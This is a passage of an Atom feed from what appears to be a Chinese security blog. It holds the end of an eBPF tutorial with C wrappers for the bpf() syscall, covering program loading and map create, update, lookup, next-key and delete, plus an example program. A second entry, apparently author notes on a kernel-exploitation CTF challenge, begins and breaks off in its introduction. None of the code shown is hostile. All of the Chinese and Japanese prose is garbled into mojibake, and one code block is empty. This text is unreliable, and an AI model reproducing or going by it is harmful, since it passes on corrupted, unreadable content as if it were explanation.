class="hljs-title">test_bpf_attr</span> =</span> &#123;<br>    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,<br>    .insns = (<span class="hljs-type">uint64_t</span>) &amp;test_bpf_prog,<br>    .insn_cnt = <span class="hljs-keyword">sizeof</span>(test_bpf_prog) / <span class="hljs-keyword">sizeof</span>(test_bpf_prog[<span class="hljs-number">0</span>]),<br>    .license = (<span class="hljs-type">uint64_t</span>) <span class="hljs-string">&quot;GPL&quot;</span>,<br>    .log_level = <span class="hljs-number">2</span>,<br>    .log_buf = (<span class="hljs-type">uint64_t</span>) test_bpf_log_buf,<br>    .log_size = TEST_BPF_LOG_SZ,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="hljs-keyword">sizeof</span>(*attr));<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> test_bpf_prog_fd;<br>    <span class="hljs-type">char</span> *err_msg;<br><br>    <span class="hljs-comment">/* load bpf prog into kernel */</span><br>    test_bpf_prog_fd = bpf(BPF_PROG_LOAD, &amp;test_bpf_attr);<br>    <span class="hljs-keyword">if</span> (test_bpf_prog_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_msg = <span class="hljs-string">&quot;FAILED to load bpf program!&quot;</span>;<br>        <span class="hljs-keyword">goto</span> err_bpf_load;<br>    &#125;<br><br>    <span class="hljs-comment">/* output the log */</span><br>    <span class="hljs-built_in">puts</span>(test_bpf_log_buf);<br><br>    close(test_bpf_prog_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err_bpf_load:<br>    <span class="hljs-built_in">puts</span>(test_bpf_log_buf);<br>err_socket:<br>    err_exit(err_msg);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å†…æ ¸ä¼šå°†ç›¸å…³çš„è¿è¡Œæ—¥å¿—å†™å…¥åˆ°æˆ‘ä»¬æ‰€æŒ‡å®šçš„ç¼“å†²åŒºå½“ä¸­ï¼Œè¿™é‡Œè¾“å‡ºæ—¥å¿—ç¼“å†²åŒºå¯ä»¥çœ‹åˆ°å†…æ ¸æˆåŠŸåœ°è§£æäº†æˆ‘ä»¬çš„ eBPF ç¨‹åºï¼š</p><p><img src="https://s2.loli.net/2023/05/31/6wJAz7CSFG91DmQ.png" alt="image.png"></p><h2 id="ä¸‰ã€raw-eBPF-map-ä½¿ç”¨"><a href="#ä¸‰ã€raw-eBPF-map-ä½¿ç”¨" class="headerlink" title="ä¸‰ã€raw eBPF map ä½¿ç”¨"></a>ä¸‰ã€raw eBPF map ä½¿ç”¨</h2><p>eBPF map ä¸ºä»¥ <code>keyâ†’value</code> æ˜ å°„æ ¼å¼å­˜å‚¨æ•°æ®çš„é€šç”¨çš„æ•°æ®å­˜å‚¨ç»“æ„ï¼Œç”¨äºåœ¨ä¸åŒç¨‹åºä¹‹é—´å…±äº«æ•°æ®ï¼Œæœ¬èŠ‚ä¸»è¦ä»‹ç» eBPF map çš„åŸºæœ¬ç”¨æ³•</p><h3 id="åˆ›å»º-eBPF-map"><a href="#åˆ›å»º-eBPF-map" class="headerlink" title="åˆ›å»º eBPF map"></a>åˆ›å»º eBPF map</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>BPF_MAP_CREATE</code> å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„ eBPF mapï¼Œå…¶ä¼šè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä½œä¸ºè¯¥ map çš„å¼•ç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_create</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size, </span><br><span class="hljs-params">               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_type = map_type,<br>        .key_size = key_size,<br>        .value_size = value_size,<br>        .max_entries = max_entries,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ›´æ–°-eBPF-map"><a href="#æ›´æ–°-eBPF-map" class="headerlink" title="æ›´æ–° eBPF map"></a>æ›´æ–° eBPF map</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>BPF_MAP_UPDATE</code> å‘½ä»¤æ›´æ–° map ä¸­å¯¹åº”çš„ <code>keyâ†’value</code> æ˜ å°„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_update_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *key,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *value,<span class="hljs-type">uint64_t</span> flags)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>        .flags = flags,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><p>flags åº”å½“ä¸ºå¦‚ä¸‹ä¹‹ä¸€ï¼š</p><table><thead><tr><th align="center">flags</th><th align="center">æè¿°</th><th align="center">å¤‡æ³¨</th></tr></thead><tbody><tr><td align="center">BPF_ANY</td><td align="center">æœ‰åˆ™æ›´æ–°ï¼Œæ— åˆ™æ–°å»º</td><td align="center"></td></tr><tr><td align="center">BPF_NOEXIST</td><td align="center">ä»…åœ¨ä¸å­˜åœ¨æ—¶è¿›è¡Œåˆ›å»º</td><td align="center">è‹¥å·²æœ‰å¯¹åº”çš„ key åˆ™è¿”å› <code>-EEXIST</code></td></tr><tr><td align="center">BPF_EXIST</td><td align="center">ä»…åœ¨å­˜åœ¨æ—¶è¿›è¡Œæ›´æ–°</td><td align="center">è‹¥æ— å¯¹åº”çš„ key åˆ™è¿”å› <code>-ENOENT</code></td></tr></tbody></table><p>åœ¨åˆ›å»ºæ–°æ˜ å°„æ—¶è‹¥ map ä¸­æ˜ å°„æ•°é‡å·²ç»è¾¾åˆ° <code>max_entries</code> åˆ™ä¼šè¿”å› <code>E2BIG</code></p><h3 id="åœ¨-eBPF-map-ä¸­æŸ¥æ‰¾"><a href="#åœ¨-eBPF-map-ä¸­æŸ¥æ‰¾" class="headerlink" title="åœ¨ eBPF map ä¸­æŸ¥æ‰¾"></a>åœ¨ eBPF map ä¸­æŸ¥æ‰¾</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>BPF_MAP_LOOKUP_ELEM</code> å‘½ä»¤æŸ¥æ‰¾ map ä¸­æ˜¯å¦å­˜åœ¨å¯¹åº”çš„ keyï¼Œè‹¥æ˜¯åˆ™å†…æ ¸ä¼šå°† value æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´æŒ‡å®šçš„ value ç¼“å†²åŒºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *value)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="éå†-eBPF-map"><a href="#éå†-eBPF-map" class="headerlink" title="éå† eBPF map"></a>éå† eBPF map</h3><p><code>BPF_MAP_GET_NEXT_KEY</code> æ˜¯ä¸€ä¸ªéå¸¸æœ‰æ„æ€çš„å‘½ä»¤ï¼Œå…¶ä¼šåœ¨ map ä¸­æŸ¥æ‰¾æˆ‘ä»¬æ‰€ä¼ å…¥çš„ keyï¼Œå¹¶å°†è¯¥ key çš„ä¸‹ä¸€ä¸ª key æ‹·è´å›ç”¨æˆ·ç©ºé—´ï¼Œè‹¥ä¸å­˜åœ¨è¯¥ key åˆ™ä¼šè¿”å› 0 å¹¶æ‹·è´ map ä¸­ç¬¬ä¸€ä¸ª key åˆ°ç”¨æˆ·ç©ºé—´ï¼Œè‹¥è¯¥ key ä¸ºæœ€åä¸€ä¸ª key åˆ™è¿”å› <code>-1</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_get_next_key</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *value)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .next_key = (<span class="hljs-type">uint64_t</span>) value,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªå‘½ä»¤æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°éå†ä¸€ä¸ª eBPF mapï¼šå…ˆä¼ å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„ key è·å–åˆ° map ä¸­çš„ç¬¬ä¸€ä¸ª keyï¼Œæ¥ä¸‹æ¥å†ä¸æ–­ <code>BPF_MAP_GET_NEXT_KEY</code> ç›´åˆ°è¿”å› <code>-1</code> å³å¯</p><h3 id="åˆ é™¤-eBPF-map-æ•°æ®"><a href="#åˆ é™¤-eBPF-map-æ•°æ®" class="headerlink" title="åˆ é™¤ eBPF map æ•°æ®"></a>åˆ é™¤ eBPF map æ•°æ®</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>BPF_MAP_DELETE_ELEM</code> å‘½ä»¤åˆ é™¤ map ä¸­å·²æœ‰çš„æ˜ å°„ï¼Œè‹¥ä¸å­˜åœ¨åˆ™ä¼šè¿”å› <code>-EPERM</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_delete_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é”€æ¯-eBPF-map"><a href="#é”€æ¯-eBPF-map" class="headerlink" title="é”€æ¯ eBPF map"></a>é”€æ¯ eBPF map</h3><p>åœ¨å†…æ ¸çš„ eBPF map æ•°æ®ç»“æ„ä¸­ä¼šä¿å­˜å¼•ç”¨äº†è¯¥ map çš„ç¨‹åºæ•°é‡ï¼Œè‹¥è¯¥ map ä¸å†è¢«ä»»ä¸€ç¨‹åºå¼•ç”¨åˆ™ä¼šè‡ªåŠ¨é‡Šæ”¾ï¼Œå› æ­¤æˆ‘ä»¬å¹¶ä¸éœ€è¦ä¸»åŠ¨å»é”€æ¯ä¸€ä¸ª eBPF mapï¼šï¼‰</p><h3 id="ä¸€ä¸ªğŸŒ°ç¨‹åº"><a href="#ä¸€ä¸ªğŸŒ°ç¨‹åº" class="headerlink" title="ä¸€ä¸ªğŸŒ°ç¨‹åº"></a><em>ä¸€ä¸ªğŸŒ°ç¨‹åº</em></h3><p>ä¸‹é¢æ˜¯ä½¿ç”¨ eBPF map çš„ä¸€ä¸ªç¤ºğŸŒ°ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;net/if.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_packet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/if_ether.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/bpf.h&gt;</span></span><br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="hljs-keyword">sizeof</span>(*attr));<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_create</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size, </span><br><span class="hljs-params">               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_type = map_type,<br>        .key_size = key_size,<br>        .value_size = value_size,<br>        .max_entries = max_entries,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *value)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_update_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *key,<span class="hljs-type">const</span> <span class="hljs-type">void</span> *value,<span class="hljs-type">uint64_t</span> flags)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>        .value = (<span class="hljs-type">uint64_t</span>) value,<br>        .flags = flags,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_delete_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *key)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">char</span> orig_value[<span class="hljs-number">0x100</span>] = <span class="hljs-string">&quot;1145141919810&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> map_fd;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Creating new eBPF map...&quot;</span>);<br>    map_fd = bpf_map_create(BPF_MAP_TYPE_HASH, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x100</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">if</span> (map_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Adding new map of key-&gt;value...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, <span class="hljs-string">&quot;arttnba3&quot;</span>, orig_value, BPF_ANY) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to update eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Looking up element in map...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, <span class="hljs-string">&quot;arttnba3&quot;</span>, value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up elem in eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get the elem of key %s: %s\n&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, value);<br><br>    close(map_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2023/05/31/C3vdouj5VryPMws.png" alt="image.png"></p><p>è¿è¡Œåœ¨å†…æ ¸ä¸­çš„ eBPF ç¨‹åºä¹Ÿå¯ä»¥é€šè¿‡ eBPF map çš„ fd è®¿é—®ä¸€ä¸ª eBPF mapï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºğŸŒ°ç¨‹åºï¼š</p><blockquote><p>æ³¨ï¼šè¿™é‡Œç¬”è€…å°†å¸¸ç”¨å‡½æ•° &amp; æŒ‡ä»¤å°è£…åœ¨äº† <a href="/download/bpf_tools.h">bpf_tools.h</a> ä¸­</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure><h1 id="0xFF-REFERENCE"><a href="#0xFF-REFERENCE" class="headerlink" title="0xFF.REFERENCE"></a>0xFF.REFERENCE</h1><p><a href="https://arthurchiao.art/blog/linux-socket-filtering-aka-bpf-zh/">[è¯‘] Linux Socket Filtering (LSF, aka BPF)ï¼ˆKernelDocï¼Œ2021ï¼‰</a></p><p><a href="https://heapdump.cn/article/5420563">HeapDump - eBPFæŒ‡ä»¤é›†è§„èŒƒv1.0</a></p><p><a href="https://www.anquanke.com/post/id/263803">BPFä¹‹è·¯ä¸€bpfç³»ç»Ÿè°ƒç”¨</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;BEE BEE Iâ€™M A SHEEP&lt;/p&gt;</summary>
    
    
    
    <category term="EBPF" scheme="https://arttnba3.github.io/categories/EBPF/"/>
    
    
    <category term="eBPF" scheme="https://arttnba3.github.io/tags/eBPF/"/>
    
    <category term="Linux kernel" scheme="https://arttnba3.github.io/tags/Linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTF.0x08ã€‘D^ 3CTF2023 d3kcache å‡ºé¢˜æ‰‹è®°</title>
    <link href="https://arttnba3.github.io/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/"/>
    <id>https://arttnba3.github.io/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/</id>
    <published>2023-05-01T17:13:27.000Z</published>
    <updated>2023-12-18T07:02:36.535Z</updated>
    
    <content type="html"><![CDATA[<p>ã€Œã•ã‚‰ã°ã€å…¨ã¦ã®ãƒªãƒŒã‚¯ã‚¹ ã‚«ãƒ¼ãƒãƒ« ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã€‚ã€</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>éƒ½æ˜¯åºŸè¯ï¼Œå¯ä»¥ä¸ç”¨çœ‹ï¼ˆç¬‘ï¼‰</p></blockquote><p>ä¸å‡ºæ„å¤–çš„è¯è¿™åº”è¯¥æ˜¯ç¬”è€…æœ¬ç§‘é˜¶æ®µæœ€åä¸€æ¬¡å‡º D3CTF çš„é¢˜ç›®äº†ï¼Œè™½ç„¶è¯´ç¬”è€…ä¸€ç›´æƒ³æ•´ä¸€äº›å¥½æ´»ï¼Œä½†æ˜¯é‰´äºç¬”è€…å®åœ¨æ˜¯å¤ªèœäº†æ‰€ä»¥ä¸€ç›´æ²¡èƒ½å‡ºè¿‡ç‰¹åˆ«ä¼˜ç§€çš„é¢˜ç›®ï¼šï¼‰</p><!--ç›¸ä¿¡æœ‰ä¸å°‘äººï¼ˆå½“ç„¶ï¼Œç¬”è€…çš„çƒ‚é¢˜åº”è¯¥ä¸ä¼šæœ‰å¤šå°‘äººæ„¿æ„åš:-D ï¼‰åº”å½“å·²ç»æ³¨æ„åˆ°é¢˜ç›®çš„ banner æ˜¯ neta è‡ªæ–°ä¸–çºªç¦éŸ³æˆ˜å£«å‰§åœºç‰ˆçš„æµ·æŠ¥----ç¬”è€…éœ€è¦ä¸ºè‡ªå·±è¿‡å»å¤±è´¥çš„è¿™ä¸€å¹´å¤šæ—¶é—´ç”»ä¸Šä¸€ä¸ªä¸å®Œç¾çš„å¥å·ï¼Œè€Œè¿™é“é¢˜ä¾¿æ˜¯ç¬”è€…å‘æ›¾ç»é‚£ä¸ªè¢«å›°äº Linux kernel 